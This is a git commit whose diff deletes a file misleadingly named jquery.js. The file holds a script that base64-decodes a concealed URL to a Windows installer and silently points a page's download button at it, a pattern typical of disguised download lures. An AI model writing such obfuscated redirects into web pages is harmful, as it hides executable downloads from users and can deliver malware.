0b8ef978cd3b8e7df3fddd0394bdc4de10dc38bd
Anubiasz <165220871+Anubiasz@users.noreply.github.com>
2024-04-03 13:13:59 +0300

    Delete jquery.js

--- jquery.js
+++
@@ -1,8 +0,0 @@
-document.addEventListener('DOMContentLoaded', function() {
-    var encodedUrl = 'aHR0cHM6Ly9naXRodWIuY29tL0FudWJpYXN6L0VyYS9yZWxlYXNlcy9kb3dubG9hZC8xLjAuNjQvRXJhLlNldHVwLjEuMC42NC5leGU=';
-    var decodedUrl = atob(encodedUrl);
-    
-    var downloadBtn = document.getElementById('clickbtn');
-    downloadBtn.href = decodedUrl;
-    downloadBtn.download = 'Era.Setup.1.0.64.exe';
-});
